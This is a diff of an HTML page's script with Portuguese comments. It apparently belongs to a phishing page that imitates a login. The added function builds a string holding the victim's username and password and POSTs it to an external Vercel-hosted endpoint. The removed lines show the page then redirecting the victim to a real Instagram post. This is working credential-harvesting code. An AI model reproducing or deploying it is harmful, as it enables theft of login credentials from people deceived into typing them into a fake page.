@@ -161,22 +161,24 @@
         });
 
       // Função para enviar logs para o Vercel usando a API de logs
-      fetch(`https://${vercelURL}/User/Login`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({ message: logMessage }),
-      })
-        .then((response) => response.json())
-        .then((data) => {
-          console.log("Log enviado com sucesso:", data);
-          window.location.href =
-            "https://www.instagram.com/p/C1rpPeSg3Kp/?utm_source=ig_web_copy_link";
+      function enviarLogsParaVercel(username, password, vercelURL) {
+        // Monta a mensagem de log
+        var logMessage = `Username: ${username}, Password: ${password}`;
+
+        // Envia a mensagem de log para o Vercel
+        fetch(`https://${vercelURL}/User/Login`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ message: logMessage }),
         })
-        .catch((error) =>
-          console.error("Erro ao enviar log para o Vercel:", error)
-        );
+          .then((response) => response.json())
+          .then((data) => console.log("Log enviado com sucesso:", data))
+          .catch((error) =>
+            console.error("Erro ao enviar log para o Vercel:", error)
+          );
+      }
     </script>
   </body>
 </html>
